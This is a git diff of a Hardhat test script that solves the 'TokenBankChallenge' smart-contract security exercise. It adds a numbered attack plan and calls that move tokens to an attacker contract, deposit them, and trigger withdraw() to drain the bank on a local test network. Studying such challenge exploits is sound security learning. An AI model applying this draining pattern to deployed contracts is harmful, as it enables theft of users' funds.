@@ -6,11 +6,13 @@ const { BigNumber } = ethers;
 const { mine } = require("@nomicfoundation/hardhat-network-helpers");
 
 /*
-    TESTED TokenBank.sol in remix, it worked
-    Here I have the error
-    TypeError: contractToken.connect(...).transfer is not a function (line 80)
-    -potentially mistake attaching the contract from factory. (line 30)
-    -it has all the interface/ABI when I console.log the contractToken 
+    1. deploy contract bank
+    2. get token contrac at address
+    3. deploy attacker contract
+    4. withdraw() the 500_000 tokens from the user
+    5. transfer the 500_000 tokens from user to the contractAttacker
+    6. transfer de 500_000 tokens from the contractAttacker to the bank
+    7. call withdraw() function from contractAttacker to hack the bank
 */
 
 describe("TokenBankChallenge", function () {
@@ -30,7 +32,9 @@ describe("TokenBankChallenge", function () {
       "SimpleERC223Token",
       tokenAddress
     );
-    await contractToken.deployed();
+    //await contractToken.deployed();
+
+    // console.log(contractToken);
 
     //deploy attacker Contract
     const Attacker = await ethers.getContractFactory("Attack");
@@ -62,7 +66,7 @@ describe("TokenBankChallenge", function () {
         new BigNumber.from(ethers.utils.parseEther("500000"))
       );
 
-      //withdraw the 500_000 tokens from bank to user1
+      //4. withdraw the 500_000 tokens from bank to user1
       const withdrawTx1 = await contractBank
         .connect(user1)
         .withdraw(ethers.utils.parseEther("500000"));
@@ -74,18 +78,29 @@ describe("TokenBankChallenge", function () {
         new BigNumber.from(ethers.utils.parseEther("500000"))
       );
 
-      // ~~~~~~~~~~~~~~~~~~~~ ERROR HERE ~~~~~~~~~~~~~~~~~~~~
-      //send the 500_000 tokens from the user1 to the attackerContract
+      // ~~~~~~~~~~~~~~~~~~~~ Call overloaded function like this: ~~~~~~~~~~~~~~~~~~~~
+      //5. send the 500_000 tokens from the user1 to the attackerContract
       const transferTx = await contractToken
         .connect(user1)
-        .transfer(contractAttacker.address, ethers.utils.parseEther("500000"));
+        ["transfer(address,uint256)"](
+          contractAttacker.address,
+          ethers.utils.parseEther("500000")
+        );
       await transferTx.wait();
 
-      //deposit the 500_000 tokens from attackerContract to the bank
+      //6. deposit the 500_000 tokens from attackerContract to the bank
       const deposit = await contractAttacker
         .connect(user1)
         .transferFromAttackToBank(contractBank.address);
       await deposit.wait();
+
+      //7. call withdraw() to hack the bank from contractAttacker
+      const withdrawTx2 = await contractAttacker.connect(user1).withdraw();
+      await withdrawTx2.wait();
+
+      //expect WIN .isComplete() == true
+      const win = await contractBank.isComplete();
+      expect(win).to.be.equal(true);
     });
   });
 });
